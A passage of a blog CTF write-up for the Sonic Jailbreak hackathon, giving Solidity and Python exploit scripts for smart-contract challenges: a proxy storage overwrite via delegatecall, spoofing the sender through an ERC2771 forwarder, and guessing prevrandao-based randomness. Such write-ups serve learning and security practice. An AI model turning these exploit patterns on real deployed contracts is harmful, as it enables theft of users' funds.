<!DOCTYPE html><html lang="kr" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="(CTF) Sonic Jailbreak hackathon writeup" /><meta property="og:locale" content="kr" /><meta name="description" content="Sonic Jailbreak hackathon writeup" /><meta property="og:description" content="Sonic Jailbreak hackathon writeup" /><link rel="canonical" href="http://blog.solidity.kr/posts/(ctf)-sonic-jailbreak-hackathon/" /><meta property="og:url" content="http://blog.solidity.kr/posts/(ctf)-sonic-jailbreak-hackathon/" /><meta property="og:site_name" content="snwo" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2025-06-15T01:02:13+09:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="(CTF) Sonic Jailbreak hackathon writeup" /><meta name="twitter:site" content="@snwo_kr" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"description":"Sonic Jailbreak hackathon writeup","url":"http://blog.solidity.kr/posts/(ctf)-sonic-jailbreak-hackathon/","@type":"BlogPosting","headline":"(CTF) Sonic Jailbreak hackathon writeup","dateModified":"2025-06-15T01:37:38+09:00","datePublished":"2025-06-15T01:02:13+09:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://blog.solidity.kr/posts/(ctf)-sonic-jailbreak-hackathon/"},"@context":"https://schema.org"}</script><title>(CTF) Sonic Jailbreak hackathon writeup | snwo</title><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="https://media.discordapp.net/attachments/952583628351746111/1366448241180409956/ralph.png?ex=68f9ac58&is=68f85ad8&hm=fa5cd570119d286902631feb85f361030c6a4f7c3eb252f258530ed92ba7ba4b&=&format=webp&quality=lossless&width=2488&height=2168" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">snwo</a></div><div class="site-subtitle font-italic">Interested in REV,WEB3,PWN</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/snwox" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/snwo_kr" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['',''].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>(CTF) Sonic Jailbreak hackathon writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>(CTF) Sonic Jailbreak hackathon writeup</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/snwo_kr">snwo</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" date="2025-06-15 01:02:13 +0900" data-toggle="tooltip" data-placement="bottom" title="Sun, Jun 15, 2025, 1:02 AM +0900" >Jun 15</em> </span> <span> Updated <em class="timeago" date="2025-06-15 01:37:38 +0900 " data-toggle="tooltip" data-placement="bottom" title="Sun, Jun 15, 2025, 1:37 AM +0900" >Jun 15</em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="3401 words"> <em>18 min</em> read</span></div></div></div><div class="post-content"><p>I played the Sonic Jailbreak hackathon with @yanhui. Only one team that completed all challenges could receive half of the prize (total 55,000 S tokens). We expected a lot of competition, but we were the only team that solved all challenges :d</p><p>The interesting part was <a href="https://sonicscan.org/address/0x38dd721dFd51FdEe02e6641e0CE0d5872aDB90B1">pot contract</a>. After solving each challenge, the challenge contract calls <code class="language-plaintext highlighter-rouge">addPoints</code> function in pot contract, and when a user reaches 200 points, they can call the <code class="language-plaintext highlighter-rouge">claimWin</code> function to get an NFT token. But that doesn’t mean we can withdraw the prize :d <del>we received the prize after a month</del></p><p>You can check the info&amp;challenges here</p><blockquote><p><a href="https://blog.soniclabs.com/sonic-summit-jailbreak-hackathon-2025-users-vs-developers/">blog.soniclabs.com/sonic-summit-jailbreak-hackathon-2025-users-vs-developers</a></p></blockquote><blockquote><p><a href="https://github.com/cantinasec/vienna_hackathon_2025">github.com/cantinasec/vienna_hackathon_2025</a></p></blockquote><p>All the transaction hashes can be found in <a href="https://sonicscan.org/">sonicscan.org</a></p><h2 id="eu-tu-proxy">Eu Tu Proxy?<a href="#eu-tu-proxy" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p><a href="https://github.com/cantinasec/vienna_hackathon_2025/tree/main/EU_TU_PROXY">challenge link</a></p><hr /><p>Transaction hash: 0x5bcd073052cfaafda0b38ee976d6612f937c967112651cbc9510b8203eabfc6e, 0xf1f8616a6ac71d852d17d82f63fd943760d3e88b1f82e6c76909c03c78d8c015</p><ul><li><p>exploit code</p><div class="language-solidity highlighter-rouge"><div class="code-header"> <span label-text="Solidity"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre>  <span class="c1">// SPDX-License-Identifier: UNLICENSED
</span>  <span class="k">pragma</span> <span class="n">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">13</span><span class="p">;</span>
    
  <span class="k">import</span> <span class="p">{</span><span class="n">Script</span><span class="p">,</span> <span class="n">console</span><span class="p">}</span> <span class="n">from</span> <span class="s">"forge-std/Script.sol"</span><span class="p">;</span>
    
  <span class="k">import</span> <span class="p">{</span><span class="n">ChallengeEasy4</span><span class="p">}</span> <span class="n">from</span> <span class="s">"../vienna_hackathon_2025/EU_TU_PROXY/Challenge_Easy_4.sol"</span><span class="p">;</span>
    
  <span class="k">contract</span> <span class="n">Easy4Script</span> <span class="k">is</span> <span class="n">Script</span> <span class="p">{</span>
    
      <span class="k">function</span> <span class="n">run</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
          <span class="n">vm</span><span class="p">.</span><span class="n">startBroadcast</span><span class="p">();</span>
          <span class="kt">address</span> <span class="n">player</span> <span class="o">=</span> <span class="n">vm</span><span class="p">.</span><span class="n">envAddress</span><span class="p">(</span><span class="s">"PLAYER"</span><span class="p">);</span>
          <span class="kt">address</span> <span class="n">chall</span> <span class="o">=</span> <span class="mh">0xb73E7da3fA04A37bbE6be13CA4f1eC68b82a8A26</span><span class="p">;</span>
    
          <span class="p">(</span><span class="kt">bool</span> <span class="n">success</span><span class="p">,</span> <span class="kt">bytes</span> <span class="k">memory</span> <span class="n">data</span><span class="p">)</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="n">chall</span><span class="p">).</span><span class="nb">call</span><span class="p">(</span><span class="n">abi</span><span class="p">.</span><span class="n">encodePacked</span><span class="p">(</span><span class="kt">uint256</span><span class="p">(</span><span class="kt">uint160</span><span class="p">(</span><span class="n">player</span><span class="p">))));</span>
          <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">"success"</span><span class="p">,</span> <span class="n">success</span><span class="p">);</span>
    
          <span class="n">ChallengeEasy4</span><span class="p">(</span><span class="k">payable</span><span class="p">(</span><span class="n">chall</span><span class="p">)).</span><span class="n">_0x57c1669d</span><span class="p">();</span>
    
          <span class="n">vm</span><span class="p">.</span><span class="n">stopBroadcast</span><span class="p">();</span>
      <span class="p">}</span>
  <span class="p">}</span>
</pre></table></code></div></div><li><p>writeup</p><p>https://bytegraph.xyz/bytecode/99a1c71abec5535cab31f24ea01db84c/graph the <code class="language-plaintext highlighter-rouge">slot 1</code> address has code that sets the <code class="language-plaintext highlighter-rouge">slot 2</code> to calldata, so using fallback to delecatecall <code class="language-plaintext highlighter-rouge">slot 1</code> address, set <code class="language-plaintext highlighter-rouge">slot 2</code> to my address and call <code class="language-plaintext highlighter-rouge">_0x57c1669d</code> to claim the points</p></ul><h2 id="mightys-identity-crisis">MIGHTY’s IDENTITY CRISIS<a href="#mightys-identity-crisis" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p><a href="https://github.com/cantinasec/vienna_hackathon_2025/tree/main/MIGHTY'S_IDENTITY_CRISIS">challenge link</a></p><hr /><p>Transaction hash: 0x15229302aaf7f9f7d1f4473342985ca951829fbcbd56f7129fd2c86c2af78bec</p><ul><li><p>exploit code</p><div class="language-solidity highlighter-rouge"><div class="code-header"> <span label-text="Solidity"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
</pre><td class="rouge-code"><pre>  <span class="k">import</span> <span class="s">"@openzeppelin/contracts/metatx/ERC2771Forwarder.sol"</span><span class="p">;</span>
  <span class="k">import</span> <span class="s">"@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol"</span><span class="p">;</span>
    
  <span class="k">contract</span> <span class="n">Easy1Script</span> <span class="k">is</span> <span class="n">Script</span> <span class="p">{</span>
    
      <span class="k">function</span> <span class="n">run</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
          <span class="n">vm</span><span class="p">.</span><span class="n">startBroadcast</span><span class="p">();</span>
          <span class="kt">address</span> <span class="n">player</span> <span class="o">=</span> <span class="n">vm</span><span class="p">.</span><span class="n">envAddress</span><span class="p">(</span><span class="s">"PLAYER"</span><span class="p">);</span>
          <span class="kt">uint256</span> <span class="n">priv</span> <span class="o">=</span> <span class="n">vm</span><span class="p">.</span><span class="n">envUint</span><span class="p">(</span><span class="s">"PLAYER_PRIV_KEY"</span><span class="p">);</span>
    
          <span class="kt">address</span> <span class="n">chall</span> <span class="o">=</span> <span class="mh">0x1237B533A88612E27aE447f7D84aa7Eb6722e39D</span><span class="p">;</span>
          <span class="n">ERC2771Forwarder</span> <span class="n">forwarder</span> <span class="o">=</span> <span class="n">ERC2771Forwarder</span><span class="p">(</span><span class="mh">0x141Fb23a7087ebb9858FEDC320DE5371C7e84cA2</span><span class="p">);</span>
    
          <span class="n">ERC2771Forwarder</span><span class="p">.</span><span class="n">ForwardRequestData</span> <span class="k">memory</span> <span class="n">req</span> <span class="o">=</span> <span class="n">ERC2771Forwarder</span><span class="p">.</span><span class="n">ForwardRequestData</span><span class="p">(</span>
              <span class="n">player</span><span class="p">,</span> <span class="c1">// from
</span>              <span class="kt">address</span><span class="p">(</span><span class="n">chall</span><span class="p">),</span>   <span class="c1">// to
</span>              <span class="mi">0</span><span class="p">,</span>  <span class="c1">// value
</span>              <span class="mi">300000</span><span class="p">,</span> <span class="c1">// gas
</span>              <span class="kt">uint48</span><span class="p">(</span><span class="n">block</span><span class="p">.</span><span class="n">timestamp</span> <span class="o">+</span> <span class="mi">1</span> <span class="kc">minutes</span><span class="p">),</span>  <span class="c1">// deadline
</span>              <span class="n">abi</span><span class="p">.</span><span class="n">encodeWithSignature</span><span class="p">(</span><span class="s">"solve()"</span><span class="p">),</span>
              <span class="k">new</span> <span class="kt">bytes</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1">// signature
</span>          <span class="p">);</span>
    
          <span class="kt">bytes32</span> <span class="n">separator</span> <span class="o">=</span> <span class="nb">keccak256</span><span class="p">(</span>
              <span class="n">abi</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span>
                  <span class="nb">keccak256</span><span class="p">(</span>
                      <span class="s">"EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"</span>
                  <span class="p">),</span>
                  <span class="nb">keccak256</span><span class="p">(</span><span class="kt">bytes</span><span class="p">(</span><span class="s">"Forwarder"</span><span class="p">)),</span>
                  <span class="nb">keccak256</span><span class="p">(</span><span class="kt">bytes</span><span class="p">(</span><span class="s">"1"</span><span class="p">)),</span>
                  <span class="mi">146</span><span class="p">,</span>
                  <span class="kt">address</span><span class="p">(</span><span class="n">forwarder</span><span class="p">)</span>
              <span class="p">)</span>
          <span class="p">);</span>
          <span class="kt">bytes32</span> <span class="n">forwarderTypeHash</span> <span class="o">=</span> <span class="nb">keccak256</span><span class="p">(</span>
              <span class="s">"ForwardRequest(address from,address to,uint256 value,uint256 gas,uint256 nonce,uint48 deadline,bytes data)"</span>
          <span class="p">);</span>
          <span class="kt">bytes32</span> <span class="n">digest</span> <span class="o">=</span> <span class="n">MessageHashUtils</span><span class="p">.</span><span class="n">toTypedDataHash</span><span class="p">(</span>
              <span class="n">separator</span><span class="p">,</span>
              <span class="nb">keccak256</span><span class="p">(</span>
                  <span class="n">abi</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span>
                      <span class="n">forwarderTypeHash</span><span class="p">,</span>
                      <span class="n">req</span><span class="p">.</span><span class="n">from</span><span class="p">,</span>
                      <span class="n">req</span><span class="p">.</span><span class="n">to</span><span class="p">,</span>
                      <span class="n">req</span><span class="p">.</span><span class="n">value</span><span class="p">,</span>
                      <span class="n">req</span><span class="p">.</span><span class="n">gas</span><span class="p">,</span>
                      <span class="mi">0</span><span class="p">,</span>
                      <span class="n">req</span><span class="p">.</span><span class="n">deadline</span><span class="p">,</span>
                      <span class="nb">keccak256</span><span class="p">(</span><span class="n">req</span><span class="p">.</span><span class="n">data</span><span class="p">)</span>
                  <span class="p">)</span>
              <span class="p">)</span>
          <span class="p">);</span>
          <span class="p">(</span><span class="kt">uint8</span> <span class="n">v</span><span class="p">,</span> <span class="kt">bytes32</span> <span class="n">r</span><span class="p">,</span> <span class="kt">bytes32</span> <span class="n">s</span><span class="p">)</span> <span class="o">=</span> <span class="n">vm</span><span class="p">.</span><span class="n">sign</span><span class="p">(</span><span class="n">priv</span><span class="p">,</span> <span class="n">digest</span><span class="p">);</span>
          <span class="kt">bytes</span> <span class="k">memory</span> <span class="n">signature</span> <span class="o">=</span> <span class="n">abi</span><span class="p">.</span><span class="n">encodePacked</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="n">v</span><span class="p">);</span>
          <span class="n">req</span><span class="p">.</span><span class="n">signature</span> <span class="o">=</span> <span class="n">signature</span><span class="p">;</span>
    
          <span class="n">forwarder</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="n">req</span><span class="p">);</span>
    
          <span class="n">vm</span><span class="p">.</span><span class="n">stopBroadcast</span><span class="p">();</span>
      <span class="p">}</span>
  <span class="p">}</span>
</pre></table></code></div></div><li><p>writeup</p><p>The <code class="language-plaintext highlighter-rouge">onlyContract()</code> checks the <code class="language-plaintext highlighter-rouge">msg.sender</code>, while <code class="language-plaintext highlighter-rouge">_msgSender()</code> that is passed to the <code class="language-plaintext highlighter-rouge">pot.addPoints()</code> can be set by the forwarder. Use the forwarder to call <code class="language-plaintext highlighter-rouge">solve()</code>, the forwarder can pass the <code class="language-plaintext highlighter-rouge">onlyContract</code> check, while the player gets the point.</p></ul><h2 id="fangs-power-ball-paradise">FANG’s POWER-BALL PARADISE<a href="#fangs-power-ball-paradise" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p><a href="https://github.com/cantinasec/vienna_hackathon_2025/tree/main/FANG'S_POWERBALL_PARADISE">challenge link</a></p><hr /><p>Transaction hash: 0x01c8ee047215fd44153b123865621321dc0bcd821eb13510da7624675200cba6</p><p>0x9bd6f3b4780c7d1177a35e52c32da3b72e162f9098a6f8a0bb1530c39bdc8e47</p><p>0x7c6729492af2227806d068f9833be62b56786e9563a7161c96ae20a876b39f05</p><p>0x9b8540cfdbb807b9be11c96bcdbdc1d60de79a1e9f9fb02255fa758792960b8a</p><p>0xa7b0eaa90e6382c7faea7d5b990a6a3fb759fbeb47fd3398a4ffdddd0fce1588</p><p>0xce3210bc8911c49c247f9c91d97b4e762387ce98a2a2c0fa074df06aadb755cf</p><p>0x459aafa8ad62d29f6e0f010ec132245e1322650033d19388641131d232e19cb8</p><p>0xc0fe24a8c215e37189e6c429c162aa0ffba0225b532a71f5e41236bb1d05c749</p><p>0xb9a49731f81510a690a21881ba0a5412c749cb6f45dcadaa395965947281add1</p><p>0x63e2612b8a5451b400579ccc3b39ea4bd746e1b3dd80174a4148aacb3ee9813f</p><p>0x542eb5c6f43f0175133ef83e02bbe770cc3d1ea26ae00133d80205d84f5a9f1c</p><ul><li><p>exploit code</p><div class="language-solidity highlighter-rouge"><div class="code-header"> <span label-text="Solidity"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
</pre><td class="rouge-code"><pre>  <span class="k">contract</span> <span class="n">Helper</span> <span class="p">{</span>
      <span class="kt">bytes32</span> <span class="k">constant</span> <span class="n">separator</span> <span class="o">=</span> <span class="mh">0xb0b9bfbe3cefbfdc6d6872e4aff4cb89d1b82df01a5fc1446178b784a19efd3c</span><span class="p">;</span>
      <span class="kt">bytes32</span> <span class="k">constant</span> <span class="n">forwarderTypeHash</span> <span class="o">=</span> <span class="mh">0x7f96328b83274ebc7c1cf4f7a3abda602b51a78b7fa1d86a2ce353d75e587cac</span><span class="p">;</span>
      <span class="n">ERC2771Forwarder</span> <span class="k">public</span> <span class="n">forwarder</span><span class="p">;</span>
    
      <span class="k">constructor</span><span class="p">(</span><span class="n">ERC2771Forwarder</span> <span class="n">_forwarder</span><span class="p">)</span> <span class="p">{</span>
          <span class="n">forwarder</span> <span class="o">=</span> <span class="n">_forwarder</span><span class="p">;</span>
      <span class="p">}</span>
    
      <span class="k">function</span> <span class="n">getHash</span><span class="p">(</span><span class="kt">address</span> <span class="n">from</span><span class="p">,</span> <span class="kt">address</span> <span class="n">to</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">nonce</span><span class="p">,</span> <span class="kt">uint48</span> <span class="n">deadline</span><span class="p">,</span> <span class="kt">bytes</span> <span class="k">calldata</span> <span class="n">data</span><span class="p">)</span> <span class="k">public</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bytes32</span><span class="p">)</span> <span class="p">{</span>
          <span class="k">return</span> <span class="n">MessageHashUtils</span><span class="p">.</span><span class="n">toTypedDataHash</span><span class="p">(</span>
              <span class="n">separator</span><span class="p">,</span>
              <span class="nb">keccak256</span><span class="p">(</span>
                  <span class="n">abi</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span>
                      <span class="n">forwarderTypeHash</span><span class="p">,</span>
                      <span class="n">from</span><span class="p">,</span>
                      <span class="n">to</span><span class="p">,</span>
                      <span class="mi">0</span><span class="p">,</span>
                      <span class="mi">300000</span><span class="p">,</span>
                      <span class="n">nonce</span><span class="p">,</span>
                      <span class="n">deadline</span><span class="p">,</span>
                      <span class="nb">keccak256</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
                  <span class="p">)</span>
              <span class="p">)</span>
          <span class="p">);</span>
      <span class="p">}</span>
    
      <span class="k">function</span> <span class="n">helpCall</span><span class="p">(</span><span class="n">ERC2771Forwarder</span><span class="p">.</span><span class="n">ForwardRequestData</span> <span class="k">memory</span> <span class="n">req</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">guess</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
          <span class="k">if</span> <span class="p">(</span><span class="n">block</span><span class="p">.</span><span class="n">prevrandao</span> <span class="o">%</span> <span class="mi">26</span> <span class="o">==</span> <span class="n">guess</span><span class="p">)</span> <span class="p">{</span>
              <span class="n">forwarder</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="n">req</span><span class="p">);</span>
              <span class="k">return</span><span class="p">;</span>
          <span class="p">}</span>
          <span class="nb">revert</span><span class="p">(</span><span class="s">"Not matched"</span><span class="p">);</span>
      <span class="p">}</span>
  <span class="p">}</span>
</pre></table></code></div></div><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
</pre><td class="rouge-code"><pre>  <span class="kn">from</span> <span class="nn">cheb3</span> <span class="kn">import</span> <span class="n">Connection</span>
  <span class="kn">from</span> <span class="nn">cheb3.utils</span> <span class="kn">import</span> <span class="n">load_compiled</span><span class="p">,</span> <span class="n">encode_with_signature</span>
  <span class="kn">from</span> <span class="nn">eth_account</span> <span class="kn">import</span> <span class="n">Account</span>
    
  <span class="kn">from</span> <span class="nn">datetime</span> <span class="kn">import</span> <span class="n">datetime</span><span class="p">,</span> <span class="n">timezone</span>
    
  <span class="n">conn</span> <span class="o">=</span> <span class="n">Connection</span><span class="p">(</span><span class="s">"https://rpc.soniclabs.com/"</span><span class="p">)</span>
  <span class="n">account</span> <span class="o">=</span> <span class="n">conn</span><span class="p">.</span><span class="n">account</span><span class="p">(</span><span class="s">"&lt;pk&gt;"</span><span class="p">)</span>
  <span class="n">challenge</span> <span class="o">=</span> <span class="s">"0x786BeE5292B12AA79725cb66f0CBfb7E10A6CAc9"</span>
  <span class="n">forwarder_addr</span> <span class="o">=</span> <span class="s">"0xEC83A9D2a4D1fbd20b062297a1996F17803Ee4A4"</span>
    
  <span class="n">helper_abi</span><span class="p">,</span> <span class="n">helper_bin</span> <span class="o">=</span> <span class="n">load_compiled</span><span class="p">(</span><span class="s">"PoC.t.sol"</span><span class="p">,</span> <span class="s">"Helper"</span><span class="p">)</span>
  <span class="n">helper</span> <span class="o">=</span> <span class="n">conn</span><span class="p">.</span><span class="n">contract</span><span class="p">(</span><span class="n">account</span><span class="p">,</span> <span class="n">abi</span><span class="o">=</span><span class="n">helper_abi</span><span class="p">,</span> <span class="n">bytecode</span><span class="o">=</span><span class="n">helper_bin</span><span class="p">)</span>
  <span class="n">helper</span><span class="p">.</span><span class="n">deploy</span><span class="p">(</span><span class="n">forwarder_addr</span><span class="p">)</span>
    
  <span class="n">forwarder_abi</span><span class="p">,</span> <span class="n">_</span> <span class="o">=</span> <span class="n">load_compiled</span><span class="p">(</span><span class="s">"ERC2771Forwarder.sol"</span><span class="p">)</span>
  <span class="n">forwarder</span> <span class="o">=</span> <span class="n">conn</span><span class="p">.</span><span class="n">contract</span><span class="p">(</span><span class="n">account</span><span class="p">,</span> <span class="n">abi</span><span class="o">=</span><span class="n">forwarder_abi</span><span class="p">,</span> <span class="n">address</span><span class="o">=</span><span class="n">forwarder_addr</span><span class="p">)</span>
    
  <span class="n">nonce</span> <span class="o">=</span> <span class="mi">0</span>
    
  <span class="k">def</span> <span class="nf">sign</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">to</span><span class="p">,</span> <span class="n">deadline</span><span class="p">,</span> <span class="n">d</span><span class="p">):</span>
      <span class="k">global</span> <span class="n">nonce</span>
      <span class="n">digest</span> <span class="o">=</span> <span class="n">helper</span><span class="p">.</span><span class="n">caller</span><span class="p">.</span><span class="n">getHash</span><span class="p">(</span>
          <span class="n">f</span><span class="p">,</span>
          <span class="n">to</span><span class="p">,</span>
          <span class="n">nonce</span><span class="p">,</span>
          <span class="n">deadline</span><span class="p">,</span>
          <span class="n">d</span>
      <span class="p">)</span>
      <span class="n">sig</span> <span class="o">=</span> <span class="n">Account</span><span class="p">.</span><span class="n">_sign_hash</span><span class="p">(</span><span class="n">digest</span><span class="p">,</span> <span class="n">account</span><span class="p">.</span><span class="n">private_key</span><span class="p">).</span><span class="n">signature</span>
      <span class="k">return</span> <span class="n">sig</span>
    
  <span class="k">def</span> <span class="nf">sign_and_execute</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">to</span><span class="p">,</span> <span class="n">t</span><span class="p">,</span> <span class="n">d</span><span class="p">):</span>
      <span class="k">global</span> <span class="n">nonce</span>
      <span class="n">deadline</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">datetime</span><span class="p">.</span><span class="n">now</span><span class="p">(</span><span class="n">timezone</span><span class="p">.</span><span class="n">utc</span><span class="p">).</span><span class="n">timestamp</span><span class="p">())</span> <span class="o">+</span> <span class="n">t</span>
      <span class="n">sig</span> <span class="o">=</span> <span class="n">sign</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">to</span><span class="p">,</span> <span class="n">deadline</span><span class="p">,</span> <span class="n">d</span><span class="p">)</span>
      <span class="n">forwarder</span><span class="p">.</span><span class="n">functions</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span>
          <span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">to</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">300000</span><span class="p">,</span> <span class="n">deadline</span><span class="p">,</span> <span class="n">d</span><span class="p">,</span> <span class="n">sig</span><span class="p">)</span>
      <span class="p">).</span><span class="n">send_transaction</span><span class="p">()</span>
      <span class="n">nonce</span> <span class="o">+=</span> <span class="mi">1</span>
    
  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">):</span>
      <span class="n">sign_and_execute</span><span class="p">(</span>
          <span class="n">account</span><span class="p">.</span><span class="n">address</span><span class="p">,</span>
          <span class="n">challenge</span><span class="p">,</span>
          <span class="mi">60</span><span class="p">,</span>
          <span class="n">encode_with_signature</span><span class="p">(</span>
              <span class="s">"start(uint256)"</span><span class="p">,</span>
              <span class="mi">3</span>
          <span class="p">)</span>
      <span class="p">)</span>
    
      <span class="n">deadline</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">datetime</span><span class="p">.</span><span class="n">now</span><span class="p">(</span><span class="n">timezone</span><span class="p">.</span><span class="n">utc</span><span class="p">).</span><span class="n">timestamp</span><span class="p">())</span> <span class="o">+</span> <span class="mi">600</span>
      <span class="n">sig</span> <span class="o">=</span> <span class="n">sign</span><span class="p">(</span><span class="n">account</span><span class="p">.</span><span class="n">address</span><span class="p">,</span> <span class="n">challenge</span><span class="p">,</span> <span class="n">deadline</span><span class="p">,</span> <span class="n">encode_with_signature</span><span class="p">(</span><span class="s">"solve()"</span><span class="p">))</span>
